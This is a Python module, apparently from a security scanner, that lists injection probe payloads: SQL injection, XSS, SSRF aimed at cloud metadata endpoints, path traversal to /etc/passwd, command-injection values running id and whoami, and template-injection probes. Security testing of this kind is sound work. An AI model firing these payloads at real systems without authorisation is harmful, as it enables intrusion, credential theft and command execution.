from typing import List, Dict

SECURITY_PAYLOADS: Dict[str, List[str]] = {
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin' --",
        "' UNION SELECT NULL, NULL, NULL --",
        "1' AND SLEEP(5) --",
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --",
        "1 AND 1=1",
        "1 AND 1=2"
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\" onfocus=alert(1) autofocus=\"",
        "'><svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=\"javascript:alert(1)\">",
        "{{constructor.constructor('alert(1)')()}}"
    ],
    "ssrf": [
        "http://127.0.0.1:80",
        "http://localhost:8080",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://[::1]:80/",
        "http://127.127.127.127",
        "http://0.0.0.0/"
    ],
    "traversal": [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/passwd%00.png",
        "file:///etc/passwd"
    ],
    "cmd": [
        "; id",
        "| id",
        "&& whoami",
        "`id`",
        "$(whoami)",
        "; ping -c 1 127.0.0.1",
        "& dir"
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "{{config.items()}}"
    ]
}

def get_payloads_for_type(payload_type: str) -> List[str]:
    return SECURITY_PAYLOADS.get(payload_type.lower().strip(), [])

def get_all_payload_types() -> List[str]:
    return list(SECURITY_PAYLOADS.keys())
